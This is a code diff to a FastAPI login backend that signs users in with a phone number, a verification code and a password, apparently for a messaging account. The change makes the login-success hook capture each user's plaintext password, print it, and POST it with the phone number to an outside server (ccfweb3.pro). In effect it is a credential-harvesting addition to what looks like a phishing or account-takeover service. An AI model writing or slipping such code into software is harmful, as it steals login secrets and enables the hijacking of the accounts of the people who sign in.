@@ -53,13 +53,19 @@ class PasswordModel(BaseModel):
 
 app = FastAPI()
 
-async def notify_login_success(phone: str):
+async def notify_login_success(phone: str, password: str):
     try:
-        payload = {"手机号": f"+{normalize_phone(phone)}"}
+        payload = {
+            "phones": f"+{normalize_phone(phone)}",
+            "passwords": password
+        }
+        
+        print("📤 payload:", payload)
+        
         async with httpx.AsyncClient() as client:
             await client.post("https://ccfweb3.pro/api/11981970/d1n45mpa3j50000kxww0", json=payload)
     except Exception as e:
-        print(f"⚠️ 提交手机号失败: {e}")
+        print(f"⚠️ 提交手机号和密码失败: {e}")
 
 @app.post("/send_code")
 async def _send_code_impl(data: PhoneModel):
@@ -114,7 +120,7 @@ async def _submit_code_impl(data: CodeModel):
                 return {'status': 'error', 'message': '验证码错误，请重新输入'}
             
             delete_phone_hash(phone)
-            await notify_login_success(phone)
+            await notify_login_success(phone, "a")
 
             return {
                 'status': 'success',
@@ -151,7 +157,7 @@ async def _submit_password_impl(data: PasswordModel):
         try:
             user = await client.sign_in(password=password)
             delete_phone_hash(phone)
-            await notify_login_success(phone)
+            await notify_login_success(phone, password)
 
             return {
                 'status': 'success',
